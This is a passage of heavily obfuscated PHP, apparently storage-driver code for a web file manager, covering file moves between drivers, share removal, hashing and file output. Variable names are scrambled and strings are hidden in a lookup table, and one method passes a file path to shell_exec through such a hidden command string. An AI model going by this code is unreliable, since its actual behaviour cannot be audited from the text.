$”Ëµ‚÷™[$£Œ„ˆÛ‘[32]] . $£Œ„ˆÛ‘[214] . $È‘æÍë£); $ã¹•Ëá->task[$£Œ„ˆÛ‘[843]] = (double) $¬êÎ°Ïª; $Ø‰Ø–”† = KodIO::defaultDriver(); $Ûæ¢úÎ€ = $Ø‰Ø–”†[$£Œ„ˆÛ‘[484]]; $¶áú˜Öõ = $²¤Ş·° = $†—´ï = array(); $˜Õôè¡— = Model($£Œ„ˆÛ‘[230])->where($¯·ğû­)->field($£Œ„ˆÛ‘[2318])->select(); foreach ($˜Õôè¡— as $¸½Éíê) { $“Œö•Ø˜ = $¸½Éíê[$£Œ„ˆÛ‘[550]]; if ($èº¼¯ºê) { $²¤Ş·°[] = $“Œö•Ø˜; continue; } $ùÎÊ™Á = $¸½Éíê[$£Œ„ˆÛ‘[87]]; $Ş¿¾¯¥È = get_path_father($ùÎÊ™Á); $†—´ï[] = $Ş¿¾¯¥È; $Ş¿¾¯¥È = str_replace("\173\151\x6f\72{$È‘æÍë£}\x7d\57", "\x7b\x69\x6f\x3a{$Ûæ¢úÎ€}\x7d\x2f", $Ş¿¾¯¥È); if (!IO::exist($ùÎÊ™Á)) { $¶áú˜Öõ[] = $“Œö•Ø˜; $ã¹•Ëá->updateFileEnd($¸½Éíê[$£Œ„ˆÛ‘[32]], $¸½Éíê[$£Œ„ˆÛ‘[79]]); write_log($£Œ„ˆÛ‘[2319] . $ùÎÊ™Á, $£Œ„ˆÛ‘[1900]); continue; } $Áò—Ã‡¸ = IO::move($ùÎÊ™Á, $Ş¿¾¯¥È, REPEAT_RENAME); if (!$Áò—Ã‡¸) { $²¤Ş·°[] = $“Œö•Ø˜; $ã¹•Ëá->updateFileEnd($¸½Éíê[$£Œ„ˆÛ‘[32]], $¸½Éíê[$£Œ„ˆÛ‘[79]]); write_log($£Œ„ˆÛ‘[2320] . $ùÎÊ™Á, $£Œ„ˆÛ‘[1900]); continue; } $¯·ğû­ = array($£Œ„ˆÛ‘[550] => $“Œö•Ø˜); $ò‰·êÙ = array($£Œ„ˆÛ‘[897] => $Ûæ¢úÎ€, $£Œ„ˆÛ‘[87] => $Áò—Ã‡¸); Model($£Œ„ˆÛ‘[230])->where($¯·ğû­)->save($ò‰·êÙ); } $ïçÑÛ‚” = $ã¹•Ëá->task; if (!$èº¼¯ºê) { Cache::set($Ñûöˆ¿’, $ïçÑÛ‚”); } $ã¹•Ëá->end(); $¶áú˜Öõ = array_unique($¶áú˜Öõ); $²¤Ş·° = array_unique($²¤Ş·°); if (!$èº¼¯ºê && ($¶áú˜Öõ || $²¤Ş·°)) { $‘ÜÑ¹‘È = array(); if ($¶áú˜Öõ) { $‘ÜÑ¹‘È[] = sprintf(LNG($£Œ„ˆÛ‘[2321]), count($¶áú˜Öõ)); } if ($²¤Ş·°) { $‘ÜÑ¹‘È[] = sprintf(LNG($£Œ„ˆÛ‘[2322]), count($²¤Ş·°)); } $‘ÜÑ¹‘È = sprintf(LNG($£Œ„ˆÛ‘[2323]), implode($£Œ„ˆÛ‘[2324], $‘ÜÑ¹‘È)) . $£Œ„ˆÛ‘[2325] . date($£Œ„ˆÛ‘[2326]) . $£Œ„ˆÛ‘[2327]; if ($ø€Î¥á² == $£Œ„ˆÛ‘[1937]) { $‘ÜÑ¹‘È .= $£Œ„ˆÛ‘[2328] . LNG($£Œ„ˆÛ‘[2329]); } $ïçÑÛ‚”[$£Œ„ˆÛ‘[1265]] = $‘ÜÑ¹‘È; Cache::set($Ñûöˆ¿’, $ïçÑÛ‚”); unset($”Ëµ‚÷™[$£Œ„ˆÛ‘[6]]); $ÀôÑÔŒ = array($£Œ„ˆÛ‘[484] => $È‘æÍë£, $£Œ„ˆÛ‘[2207] => $£Œ„ˆÛ‘[629], $£Œ„ˆÛ‘[32] => $”Ëµ‚÷™[$£Œ„ˆÛ‘[32]], $£Œ„ˆÛ‘[1288] => $”Ëµ‚÷™); Hook::trigger($£Œ„ˆÛ‘[1781], array($£Œ„ˆÛ‘[1288] => $ÀôÑÔŒ, $£Œ„ˆÛ‘[1298] => !0)); show_json($‘ÜÑ¹‘È, !1, 100111); } if ($ø€Î¥á² == $£Œ„ˆÛ‘[629]) { return !0; } if ($¶áú˜Öõ || $²¤Ş·°) { $ÏÛ«ËÍò = array_merge($¶áú˜Öõ, $²¤Ş·°); $ÏÛ«ËÍò = array_filter(array_unique($ÏÛ«ËÍò)); $this->removeByFileID($ÏÛ«ËÍò); } if ($†—´ï) { $†—´ï = array_filter(array_unique($†—´ï)); foreach ($†—´ï as $ùÎÊ™Á) { $¼…Ã¿û = IO::has($ùÎÊ™Á, !0); if (!$¼…Ã¿û[$£Œ„ˆÛ‘[239]] && !$¼…Ã¿û[$£Œ„ˆÛ‘[240]]) { IO::remove($ùÎÊ™Á); } } } return $this->remove($È‘æÍë£); } private function removeByFileID($â¤å‘Ãœ = array()) { $Ì€ø®¶ =& $_SERVER[ç¦¬”œš]; if (empty($â¤å‘Ãœ)) { return; } $¯…óœªñ = array($Ì€ø®¶[550] => array($Ì€ø®¶[7], $â¤å‘Ãœ)); $Ö±†æ³¬ = Model($Ì€ø®¶[1419])->where($¯…óœªñ)->field($Ì€ø®¶[193])->select(); if (!$Ö±†æ³¬) { return Model($Ì€ø®¶[553])->remove($â¤å‘Ãœ); } $Ö±†æ³¬ = array_to_keyvalue($Ö±†æ³¬, $Ì€ø®¶[12], $Ì€ø®¶[193]); foreach ($Ö±†æ³¬ as $Ş³ş¹§Ä) { Model($Ì€ø®¶[904])->removeNow($Ş³ş¹§Ä, !1); } } private function removeShareItems($€Â­òÑş) { $ä›Æ§ŠÀ =& $_SERVER[ç¦¬”œš]; $¼‘ß¥¡ = "\x7b\x69\157\x3a{$€Â­òÑş}\175\57"; $¼äğ«¡ = array($ä›Æ§ŠÀ[193] => 0, $ä›Æ§ŠÀ[1258] => array($ä›Æ§ŠÀ[459], "{$¼‘ß¥¡}\x25")); $ğ¬ßè€¦ = Model($ä›Æ§ŠÀ[1948])->where($¼äğ«¡)->field($ä›Æ§ŠÀ[674])->select(); if (empty($ğ¬ßè€¦)) { return; } $š—Æ°Ìê = array_to_keyvalue($ğ¬ßè€¦, $ä›Æ§ŠÀ[12], $ä›Æ§ŠÀ[674]); Model($ä›Æ§ŠÀ[673])->remove($š—Æ°Ìê); } } goto DÍİ¢Àá÷°; E÷ç¬®ƒ¬: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Öš‡Úë× =& $_SERVER[ç¦¬”œš]; $this->objectDriver = array($Öš‡Úë×[60], $Öš‡Úë×[61], $Öš‡Úë×[62], $Öš‡Úë×[63], $Öš‡Úë×[64], $Öš‡Úë×[65], $Öš‡Úë×[66], $Öš‡Úë×[67], $Öš‡Úë×[68], $Öš‡Úë×[69], $Öš‡Úë×[70], $Öš‡Úë×[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ª ­²ú›) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ª ­²ú›, $_SERVER[ç¦¬”œš][8]); } return $ª ­²ú›; } public function iconvApp($ãïèğ) { return $ãïèğ; } public function iconvSystem($ÜÕµ¦Ã¿) { return $ÜÕµ¦Ã¿; } public function iconvTo($”¹‘·, $¶’•Âíå, $Ùıª´¶ñ) { $Ìåö¸Ë½ =& $_SERVER[ç¦¬”œš]; if (!$”¹‘· || !function_exists($Ìåö¸Ë½[72])) { return $”¹‘·; } static $‡ö¨«è = array(); $„îÕ¾Í = $¶’•Âíå . $Ìåö¸Ë½[73] . $Ùıª´¶ñ . $Ìåö¸Ë½[74] . $”¹‘·; if (isset($‡ö¨«è[$„îÕ¾Í])) { return $‡ö¨«è[$„îÕ¾Í]; } if (function_exists($Ìåö¸Ë½[75])) { $íÌÆÔ§ò = @mb_convert_encoding($”¹‘·, $Ùıª´¶ñ, $¶’•Âíå); } else { $íÌÆÔ§ò = @iconv($¶’•Âíå, $Ùıª´¶ñ, $”¹‘·); } $íÌÆÔ§ò = $íÌÆÔ§ò ? $íÌÆÔ§ò : $”¹‘·; if (strstr($íÌÆÔ§ò, $Ìåö¸Ë½[76])) { $íÌÆÔ§ò = str_replace($Ìåö¸Ë½[76], $Ìåö¸Ë½[11], $íÌÆÔ§ò); } $‡ö¨«è[$¶’•Âíå . $Ìåö¸Ë½[73] . $Ùıª´¶ñ . $Ìåö¸Ë½[74] . $”¹‘·] = $íÌÆÔ§ò; $‡ö¨«è[$Ùıª´¶ñ . $Ìåö¸Ë½[73] . $¶’•Âíå . $Ìåö¸Ë½[74] . $”¹‘·] = $”¹‘·; $‡ö¨«è[$Ùıª´¶ñ . $Ìåö¸Ë½[73] . $¶’•Âíå . $Ìåö¸Ë½[74] . $íÌÆÔ§ò] = $”¹‘·; $‡ö¨«è[$¶’•Âíå . $Ìåö¸Ë½[73] . $Ùıª´¶ñ . $Ìåö¸Ë½[74] . $íÌÆÔ§ò] = $íÌÆÔ§ò; return $íÌÆÔ§ò; } public function getPathInner($’£İÎåÇ) { $Ãê§ÊâŸ = IO::init($’£İÎåÇ); return $Ãê§ÊâŸ->path; } public function getPathOuter($¨ºÅ¥¶) { $ÊÔÛ½ÓØ =& $_SERVER[ç¦¬”œš]; $Æê¯Ó… = strlen(trim($this->pathBase, $ÊÔÛ½ÓØ[8])); $¨ºÅ¥¶ = substr(trim($¨ºÅ¥¶, $ÊÔÛ½ÓØ[8]), $Æê¯Ó…); return $this->pathDriver . $ÊÔÛ½ÓØ[8] . ltrim($¨ºÅ¥¶, $ÊÔÛ½ÓØ[8]); } public function isParentOf($† ˆàŠ¿, $¦’á³æ) { $êâˆ£ÆÎ =& $_SERVER[ç¦¬”œš]; $† ˆàŠ¿ = rtrim(strtolower($† ˆàŠ¿), $êâˆ£ÆÎ[8]) . $êâˆ£ÆÎ[8]; $¦’á³æ = rtrim(strtolower($¦’á³æ), $êâˆ£ÆÎ[8]) . $êâˆ£ÆÎ[8]; $ÆùŞ˜Ø = strpos($¦’á³æ, $† ˆàŠ¿) === 0; return $ÆùŞ˜Ø; } public function getType() { $Œ†Û”‹³ =& $_SERVER[ç¦¬”œš]; $¨Ş¦óËë = str_replace($Œ†Û”‹³[77], $Œ†Û”‹³[12], get_class($this)); return strtolower($¨Ş¦óËë); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($®¤°ˆÈò, $¢†ê›Ú¸) { $ú›¢ÉĞ =& $_SERVER[ç¦¬”œš]; $²Šá¶å = rtrim($®¤°ˆÈò, $ú›¢ÉĞ[8]) . $ú›¢ÉĞ[8] . $¢†ê›Ú¸; $˜ŞºËÀë = $this->exist($²Šá¶å); return $˜ŞºËÀë ? $²Šá¶å : !1; } public function setModifyTime($Ï²–£êÓ, $Â–Ò“·¹ = '') { } public function renameObject($­™ÂáßÎ, $ıêŞ™°) { $¾ª¤ëû = $ıêŞ™°; $­™ÂáßÎ = $this->getPathOuter($­™ÂáßÎ); $ıêŞ™° = $this->pathFather($­™ÂáßÎ) . $ıêŞ™°; $ŒâˆÎ‘Ä = IO::copy($­™ÂáßÎ, $this->pathFather($­™ÂáßÎ), REPEAT_RENAME_FOLDER, $¾ª¤ëû); if ($ŒâˆÎ‘Ä) { IO::remove($­™ÂáßÎ); } return $ŒâˆÎ‘Ä ? $ıêŞ™° : !1; } public function tempFile($¬½ô·Á« = '', $—’ĞŞœ = '') { if (!$¬½ô·Á«) { $¬½ô·Á« = rand_string(15); } $ì›¹±÷‹ = TEMP_FILES . rand_string(15) . $_SERVER[ç¦¬”œš][8]; @mkdir($ì›¹±÷‹, DEFAULT_PERRMISSIONS, !0); $ºÁÔßÉí = $ì›¹±÷‹ . $¬½ô·Á«; @touch($ºÁÔßÉí); if ($—’ĞŞœ) { file_put_contents($ºÁÔßÉí, $—’ĞŞœ); } return $ºÁÔßÉí; } public function tempFileRemve($í³Õ¡) { @unlink($í³Õ¡); @rmdir($this->pathFather($í³Õ¡)); } public function mkfile($õ¤©™ª½, $½œ¹Š…‚ = '', $Ù™ñõ¥ì = REPEAT_RENAME) { } public function mkdir($©âó¼Àö, $œÒ‘ä¥ = REPEAT_SKIP) { } public function delFile($Äæ÷ÅÕá) { } public function delFolder($õıÊ¶ä¸) { } public function copyFile($³éÁÇÖª, $ù–Ñ‘éö) { } public function moveFile($ñºâğü‹, $îº¬ë–¯) { } public function remove($¼©ØÉÄú) { if ($this->isFile($¼©ØÉÄú)) { return $this->delFile($¼©ØÉÄú); } return $this->delFolder($¼©ØÉÄú); } public function rename($Ÿò¡ŒÚ, $ğ¥Ù²ûÅ) { } public function exist($òĞÛ¾‚) { } public function findByHash($ÔûõûÅ = '', $ˆñ–Ú§ = '') { return !1; } public function isFile($èÃåĞ) { } public function isFolder($‹û£äüå) { } public function size($éè¶ ¡…) { } public function info($¬ì›“Ë¬) { } public function infoSimple($ô¶²Ì˜Ï) { return $this->info($ô¶²Ì˜Ï); } public function infoAuth($Ÿœ™áù) { return $this->info($Ÿœ™áù); } public function infoFull($àĞ¡ÙÆÍ) { return $this->info($àĞ¡ÙÆÍ); } public function infoFullSimple($„ŸıŠ†Å) { return $this->info($„ŸıŠ†Å); } public function infoWithChildren($–§÷©Œ) { $ƒ³Š†½ß =& $_SERVER[ç¦¬”œš]; static $ƒÒÇŒÀ = array(); if (isset($ƒÒÇŒÀ[$–§÷©Œ])) { return $ƒÒÇŒÀ[$–§÷©Œ]; } $¦…ºÆÁÇ = $this->info($–§÷©Œ); if ($¦…ºÆÁÇ && $¦…ºÆÁÇ[$ƒ³Š†½ß[33]] == $ƒ³Š†½ß[78]) { $‚£ÙÈô± = array($ƒ³Š†½ß[79] => 0, $ƒ³Š†½ß[80] => 0, $ƒ³Š†½ß[81] => 0); $this->infoChildren($–§÷©Œ, $‚£ÙÈô±); $¦…ºÆÁÇ[$ƒ³Š†½ß[79]] = $‚£ÙÈô±[$ƒ³Š†½ß[79]]; $¦…ºÆÁÇ[$ƒ³Š†½ß[82]] = array($ƒ³Š†½ß[83] => $‚£ÙÈô±[$ƒ³Š†½ß[80]], $ƒ³Š†½ß[84] => $‚£ÙÈô±[$ƒ³Š†½ß[81]]); $ƒÒÇŒÀ[$–§÷©Œ] = $¦…ºÆÁÇ; } return $¦…ºÆÁÇ; } public function listPath($±Á©×€…, $Ä÷ÄëİÎ = false) { } public function has($‡†„òªğ, $½ƒÃ¥Ÿì = false, $·ŠœØ¾à = false) { } public function canRead($ÚÄ¢‚ñŠ) { } public function canWrite($£ëÃ‡Æ ) { } public function getContent($ì·ôØíí) { } public function setContent($˜èî¬§›, $Íã¶Û¡Œ = '') { } protected function infoChildren($Ğ½—Ó¸†, &$—‘¤ĞÃĞ) { $ğÌ Ç¡» =& $_SERVER[ç¦¬”œš]; check_abort_echo(); $¹˜ùê…Ó = $this->listPath($Ğ½—Ó¸†, !0); $¹˜ùê…Ó = array_merge($¹˜ùê…Ó[$ğÌ Ç¡»[85]], $¹˜ùê…Ó[$ğÌ Ç¡»[86]]); foreach ($¹˜ùê…Ó as $®ÛıÌÎõ) { if ($®ÛıÌÎõ[$ğÌ Ç¡»[33]] == $ğÌ Ç¡»[78]) { $—‘¤ĞÃĞ[$ğÌ Ç¡»[81]]++; $ı³³×¥ = $this->getPathInner($®ÛıÌÎõ[$ğÌ Ç¡»[87]]); $this->infoChildren($ı³³×¥, $—‘¤ĞÃĞ); } else { $—‘¤ĞÃĞ[$ğÌ Ç¡»[80]]++; $—‘¤ĞÃĞ[$ğÌ Ç¡»[79]] += $®ÛıÌÎõ[$ğÌ Ç¡»[79]]; } } } public function fileSubstr($ª™—µà, $à™µŒÒæ, $ğ€ƒ„¦Ö) { } public function listAll($â¨§çŸŞ) { } public function listAllMake($Ş²¥ÅÈø, &$®ç¨Îè”) { $˜ñ¹‰ƒß =& $_SERVER[ç¦¬”œš]; check_abort_echo(); $€¿›ğå‰ = $this->listPath($Ş²¥ÅÈø, !0); if (!$€¿›ğå‰) { return; } $«ßÍ±ğ„ = array_merge($€¿›ğå‰[$˜ñ¹‰ƒß[85]], $€¿›ğå‰[$˜ñ¹‰ƒß[86]]); foreach ($«ßÍ±ğ„ as $òĞ€õÕ‹) { $ÂùÜğßª = $òĞ€õÕ‹[$˜ñ¹‰ƒß[33]] == $˜ñ¹‰ƒß[78]; $Å”Ø¯ÓÔ = array($˜ñ¹‰ƒß[87] => $òĞ€õÕ‹[$˜ñ¹‰ƒß[87]], $˜ñ¹‰ƒß[78] => $ÂùÜğßª); if (isset($òĞ€õÕ‹[$˜ñ¹‰ƒß[79]])) { $Å”Ø¯ÓÔ[$˜ñ¹‰ƒß[79]] = $òĞ€õÕ‹[$˜ñ¹‰ƒß[79]]; } if (isset($òĞ€õÕ‹[$˜ñ¹‰ƒß[88]])) { $Å”Ø¯ÓÔ[$˜ñ¹‰ƒß[88]] = $òĞ€õÕ‹[$˜ñ¹‰ƒß[88]]; } if (!$ÂùÜğßª) { $®ç¨Îè”[] = $Å”Ø¯ÓÔ; continue; } $®ç¨Îè”[] = $Å”Ø¯ÓÔ; $ßÊÈ¿Öˆ = $òĞ€õÕ‹[$˜ñ¹‰ƒß[87]]; $”º›¬¼ = $this->pathDriver; if (substr($òĞ€õÕ‹[$˜ñ¹‰ƒß[87]], 0, strlen($”º›¬¼)) == $”º›¬¼) { $ßÊÈ¿Öˆ = substr($ßÊÈ¿Öˆ, strlen($”º›¬¼)); } $this->listAllMake($ßÊÈ¿Öˆ, $®ç¨Îè”); } } public function listAllSimple($ä«ßã«¶, $Ş‡ÂÕò• = false) { $ßõùıÉæ = $this->listAll($ä«ßã«¶); return $this->listAllSimpleMake($ßõùıÉæ, $this->getPathOuter($ä«ßã«¶), $Ş‡ÂÕò•); } public function listAllSimpleMake($ ¶£«›», $É££ıëè, $¹Àšùµé) { $²·ŠØú =& $_SERVER[ç¦¬”œš]; $Æñ„‡‰Ş = array(); $É££ıëè = rtrim(get_path_father($É££ıëè), $²·ŠØú[8]) . $²·ŠØú[8]; foreach ($ ¶£«›» as $··ŒÏÁê) { $ÙôÑÏ‚ = array($²·ŠØú[87] => $··ŒÏÁê[$²·ŠØú[87]], $²·ŠØú[89] => $··ŒÏÁê[$²·ŠØú[87]], $²·ŠØú[78] => $··ŒÏÁê[$²·ŠØú[78]]); if (isset($··ŒÏÁê[$²·ŠØú[79]]) && !$··ŒÏÁê[$²·ŠØú[78]]) { $ÙôÑÏ‚[$²·ŠØú[79]] = $··ŒÏÁê[$²·ŠØú[79]]; } if (isset($··ŒÏÁê[$²·ŠØú[88]])) { $ÙôÑÏ‚[$²·ŠØú[88]] = $··ŒÏÁê[$²·ŠØú[88]]; } if (is_array($··ŒÏÁê[$²·ŠØú[90]])) { $ÙôÑÏ‚[$²·ŠØú[89]] = $··ŒÏÁê[$²·ŠØú[90]][$²·ŠØú[87]]; $ÙôÑÏ‚[$²·ŠØú[79]] = $··ŒÏÁê[$²·ŠØú[90]][$²·ŠØú[79]]; $ÙôÑÏ‚[$²·ŠØú[88]] = $··ŒÏÁê[$²·ŠØú[90]][$²·ŠØú[88]]; } else { if (substr($··ŒÏÁê[$²·ŠØú[87]], 0, strlen($É££ıëè)) == $É££ıëè) { $ÙôÑÏ‚[$²·ŠØú[87]] = substr($··ŒÏÁê[$²·ŠØú[87]], strlen($É££ıëè)); } } $öĞé¸æ‰ = $··ŒÏÁê[$²·ŠØú[78]] ? $²·ŠØú[8] : $²·ŠØú[12]; $ÙôÑÏ‚[$²·ŠØú[89]] = rtrim($ÙôÑÏ‚[$²·ŠØú[89]], $²·ŠØú[8]) . $öĞé¸æ‰; $ÙôÑÏ‚[$²·ŠØú[87]] = $²·ŠØú[8] . trim($ÙôÑÏ‚[$²·ŠØú[87]], $²·ŠØú[8]) . $öĞé¸æ‰; if (!$¹Àšùµé) { $ÌÚ¢ Ä = explode($²·ŠØú[8], trim($ÙôÑÏ‚[$²·ŠØú[87]], $²·ŠØú[8])); $ÙôÑÏ‚[$²·ŠØú[87]] = $²·ŠØú[8] . implode($²·ŠØú[8], array_slice($ÌÚ¢ Ä, 1)) . $öĞé¸æ‰; } $Æñ„‡‰Ş[] = $ÙôÑÏ‚; } return array_sort_by($Æñ„‡‰Ş, $²·ŠØú[87]); } public function upload($¨±¬Ãı®, $À‡…¶Ù, $ÊƒÍ›± = false, $®“ûşäÙ = REPEAT_REPLACE) { } public function uploadFileByID($íÑÊä©Œ, $’ıñÌâË, $î¹˜ÒÜ¡) { } public function uploadFileByPath($îÀ­ÁáĞ, $„ÙÈ’–º, $¶’ÓÌ» = array()) { } public function isUploadServer() { $Ä×Ø¶¸² =& $_SERVER[ç¦¬”œš]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ä×Ø¶¸²[91]) { return !0; } return $GLOBALS[$Ä×Ø¶¸²[6]][$Ä×Ø¶¸²[92]][$Ä×Ø¶¸²[93]]; } public function isFileOutServer() { $»Â±¦ç« =& $_SERVER[ç¦¬”œš]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $»Â±¦ç«[91]) { return !0; } return $GLOBALS[$»Â±¦ç«[6]][$»Â±¦ç«[92]][$»Â±¦ç«[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ò—Åú¼æ) { $ÚØ´ÃöÊ =& $_SERVER[ç¦¬”œš]; if (!$this->isCdnHost()) { return $ò—Åú¼æ; } return str_replace(trim(get_url_root($ò—Åú¼æ), $ÚØ´ÃöÊ[8]), trim($this->cdnHost, $ÚØ´ÃöÊ[8]), $ò—Åú¼æ); } public function uploadLink($ÊñˆÔÊ£, $«ÙğˆÒ” = 0) { $€‘×æ =& $_SERVER[ç¦¬”œš]; if ($this->isUploadServer()) { return; } $—Œ²õø = $this->getType(); if (!in_array($—Œ²õø, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¹«ËŞÁş = 1024 * 1024 * 10; $ÈÒçŠõÕ = $«ÙğˆÒ” <= $¹«ËŞÁş ? $€‘×æ[95] : $€‘×æ[96]; $…¾¥Åˆ = (!$«ÙğˆÒ” ? 1 : ceil($«ÙğˆÒ” / pow(1024, 3))) * 3600 * 4; $¶¥šºóµ = $this->{$ÈÒçŠõÕ}($ÊñˆÔÊ£, $…¾¥Åˆ); if ($¶¥šºóµ) { $¶¥šºóµ[$€‘×æ[97]] = $ÊñˆÔÊ£; $¶¥šºóµ[$€‘×æ[98]] = $—Œ²õø; } return $¶¥šºóµ; } public function uploadFormData($œÉÀ¢÷Å, $¶£à›»Ì = 3600) { } public function multiUploadFormData($×·Ê Ëµ, $Àï›òØ = 3600) { } public function download($ß„Ì—¸, $½‘ó›Ô) { } public function ext($Ì¯ş ) { $Ìûú‰±Ú =& $_SERVER[ç¦¬”œš]; if (strpos($Ì¯ş , $Ìûú‰±Ú[8]) === -1) { $“¬èĞÅè = $Ì¯ş ; } else { $“¬èĞÅè = $this->pathThis($Ì¯ş ); } $æå×¡¶ = $Ìûú‰±Ú[12]; if (strstr($“¬èĞÅè, $Ìûú‰±Ú[10])) { $æå×¡¶ = substr($“¬èĞÅè, strrpos($“¬èĞÅè, $Ìûú‰±Ú[10]) + 1); $æå×¡¶ = strtolower($æå×¡¶); } if (strlen($æå×¡¶) > 3 && preg_match($Ìûú‰±Ú[99], $æå×¡¶, $èÔ¼å…)) { $æå×¡¶ = $Ìûú‰±Ú[12]; } return $æå×¡¶; } public function pathThis($ùÁÏÂ¸¥) { $Ú¹™“ü¬ =& $_SERVER[ç¦¬”œš]; $ùÁÏÂ¸¥ = str_replace($Ú¹™“ü¬[100], $Ú¹™“ü¬[8], rtrim($ùÁÏÂ¸¥, $Ú¹™“ü¬[8])); $ú×½ûöş = strrpos($ùÁÏÂ¸¥, $Ú¹™“ü¬[8]); if ($ú×½ûöş === !1) { return $ùÁÏÂ¸¥; } return substr($ùÁÏÂ¸¥, $ú×½ûöş + 1); } public function pathFather($×ĞØ¦Ğ‡) { $Úó±—Ò =& $_SERVER[ç¦¬”œš]; $×ĞØ¦Ğ‡ = str_replace($Úó±—Ò[100], $Úó±—Ò[8], rtrim($×ĞØ¦Ğ‡, $Úó±—Ò[8])); $ç¾â›…à = strrpos($×ĞØ¦Ğ‡, $Úó±—Ò[8]); if ($ç¾â›…à === !1) { return $Úó±—Ò[12]; } return substr($×ĞØ¦Ğ‡, 0, $ç¾â›…à + 1); } public function hashSimple($Ï¹•ëñÍ) { $’À÷„­à =& $_SERVER[ç¦¬”œš]; if (!$Ï¹•ëñÍ) { return md5($’À÷„­à[12]); } $£´ÁÕÉ¥ = $this->size($Ï¹•ëñÍ); $“†Çú× = 200; $¿ôåçì´ = 50; if ($£´ÁÕÉ¥ <= $“†Çú× * $¿ôåçì´) { return $this->hashMd5($Ï¹•ëñÍ) . $£´ÁÕÉ¥; } $ƒÜÒ€ä¬ = intval($£´ÁÕÉ¥ / $¿ôåçì´); $ª˜Ü¹Õ© = $’À÷„­à[12]; for ($úõº¾Ÿ© = 0; $úõº¾Ÿ© < $¿ôåçì´; $úõº¾Ÿ©++) { $ª˜Ü¹Õ© .= $this->fileSubstr($Ï¹•ëñÍ, $ƒÜÒ€ä¬ * $úõº¾Ÿ©, $“†Çú×); } $ª˜Ü¹Õ© .= $this->fileSubstr($Ï¹•ëñÍ, $£´ÁÕÉ¥ - $“†Çú×, $“†Çú×); return md5($ª˜Ü¹Õ©) . $£´ÁÕÉ¥; } public static $md5Cache = array(); public function hashMd5($¾Ò÷ÌÜ) { if (!$¾Ò÷ÌÜ) { return md5($_SERVER[ç¦¬”œš][12]); } $¾Ò÷ÌÜ = $this->iconvSystem($¾Ò÷ÌÜ); if (isset(self::$md5Cache[$¾Ò÷ÌÜ])) { return self::$md5Cache[$¾Ò÷ÌÜ]; } self::$md5Cache[$¾Ò÷ÌÜ] = $this->hashMd5Shell($¾Ò÷ÌÜ); if (!self::$md5Cache[$¾Ò÷ÌÜ]) { self::$md5Cache[$¾Ò÷ÌÜ] = @md5_file($¾Ò÷ÌÜ); } return self::$md5Cache[$¾Ò÷ÌÜ]; } private function hashMd5Shell($Ä”úšİ±) { $á¼Å±½ =& $_SERVER[ç¦¬”œš]; if (!$Ä”úšİ±) { return md5($á¼Å±½[12]); } if (!function_exists($á¼Å±½[101])) { return !1; } $•½“½½¥ = array($á¼Å±½[102], $á¼Å±½[103]); $È™ıî‰¤ = Cache::get($á¼Å±½[104]); if (!$È™ıî‰¤) { $ŒóÊ‚ËÌ = BASIC_PATH . $á¼Å±½[105]; $Öš¿ÈÈ÷ = md5_file($ŒóÊ‚ËÌ); $È™ıî‰¤ = $á¼Å±½[106]; foreach ($•½“½½¥ as $ïšçŒşŸ) { $Ú‹Ä¬Å© = shell_exec($ïšçŒşŸ . "\40\x22{$ŒóÊ‚ËÌ}\42"); if ($Ú‹Ä¬Å© && substr(trim($Ú‹Ä¬Å©), 0, 32) == $Öš¿ÈÈ÷) { $È™ıî‰¤ = $ïšçŒşŸ; break; } } Cache::set($á¼Å±½[104], $È™ıî‰¤, 3600); } if ($È™ıî‰¤ == $á¼Å±½[106]) { return !1; } $Ú‹Ä¬Å© = shell_exec($È™ıî‰¤ . "\x20\x22{$Ä”úšİ±}\42"); $Ú‹Ä¬Å© = str_replace($á¼Å±½[107], $á¼Å±½[12], $Ú‹Ä¬Å©); return substr($Ú‹Ä¬Å©, 0, 32); } public function link($ÃôÄ§¿Ä) { return $ÃôÄ§¿Ä; } public function fileOut($éàùÂ—Ù, $šÏøÄ¼ˆ = false, $üÌñ­ïô = false, $¡Œßà×Í = '') { $‡Ó’ÃÚø =& $_SERVER[ç¦¬”œš]; $this->cacheMethod(null, null); if (!$éàùÂ—Ù || !$this->exist($éàùÂ—Ù)) { show_json(LNG($‡Ó’ÃÚø[108]), !1, $üÌñ­ïô); } $¿ÄÚ”¾í = $this->getType() == $‡Ó’ÃÚø[109]; $‹ç¹ú™¼ = $GLOBALS[$‡Ó’ÃÚø[6]][$‡Ó’ÃÚø[92]][$‡Ó’ÃÚø[110]][$‡Ó’ÃÚø[111]]; $ÃÊÆŠ§ = (double) $GLOBALS[$‡Ó’ÃÚø[6]][$‡Ó’ÃÚø[92]][$‡Ó’ÃÚø[110]][$‡Ó’ÃÚø[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¾Ñò¡‡Õ = $this->infoFull($éàùÂ—Ù); $¯Šê¿Ğú = $¾Ñò¡‡Õ[$‡Ó’ÃÚø[79]]; $Ç³ùªš¹ = gmdate($‡Ó’ÃÚø[113], $¾Ñò¡‡Õ[$‡Ó’ÃÚø[88]]); $²öãõğ = $üÌñ­ïô ? $üÌñ­ïô : $this->iconvApp($¾Ñò¡‡Õ[$‡Ó’ÃÚø[32]]); $Ú¦ªÏ±– = 0; $ı–ÔáÔ° = $¯Šê¿Ğú - 1; $½ªÃ“ı = $this->ext($²öãõğ); if (in_array($½ªÃ“ı, array($‡Ó’ÃÚø[114], $‡Ó’ÃÚø[115], $‡Ó’ÃÚø[116], $‡Ó’ÃÚø[117]))) { $½ªÃ“ı = $‡Ó’ÃÚø[118]; } if (in_array($½ªÃ“ı, array($‡Ó’ÃÚø[119]))) { $½ªÃ“ı = $‡Ó’ÃÚø[120]; } if (!$¡Œßà×Í) { $¡Œßà×Í = md5($Ç³ùªš¹ . $¯Šê¿Ğú); } $¡Œßà×Í = $‡Ó’ÃÚø[121] . $¡Œßà×Í . $‡Ó’ÃÚø[121]; $¥ğÊ¯® = get_file_mime($½ªÃ“ı); $—µîÖ€È = !0; $—µîÖ€È = 